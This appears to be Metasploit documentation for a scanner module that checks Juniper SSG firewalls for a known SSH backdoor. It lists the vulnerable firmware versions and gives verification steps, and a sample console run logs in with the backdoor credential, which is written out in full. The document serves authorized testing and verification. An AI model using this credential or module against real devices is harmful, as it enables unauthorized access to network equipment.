## Vulnerable Application

  Juniper JunOS between 6.2.0r15 to 6.2.0r18 and 6.3.0r12 to 6.3.0r20 are vulnerable.
  
  A vulnerable copy of the firmware is available for a Juiper SSG5/SSG20 (v6.3.0r19.0): [here](https://github.com/h00die/MSF-Testing-Scripts/tree/master/juniper_firmware)

  For verification puposes, an example vuln python script is also available [here](https://github.com/h00die/MSF-Testing-Scripts)

## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Do: ` use auxiliary/scanner/ssh/juniper_backdoor`
  4. Do: `set rhosts`
  5. Do: `run`
  6. You should see: `[+] 192.168.1.1:22 - Logged in with backdoor account admin:<<< %s(un='%s') = %u`

## Scenarios

  Example run against a Juniper SSG5 with vuln firmware from above link.

```
msf > use auxiliary/scanner/ssh/juniper_backdoor
msf auxiliary(juniper_backdoor) > set rhosts 192.168.1.1
rhosts => 192.168.1.1
msf auxiliary(juniper_backdoor) > set verbose true
verbose => true
msf auxiliary(juniper_backdoor) > run

[+] 192.168.1.1:22 - Logged in with backdoor account admin:<<< %s(un='%s') = %u
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
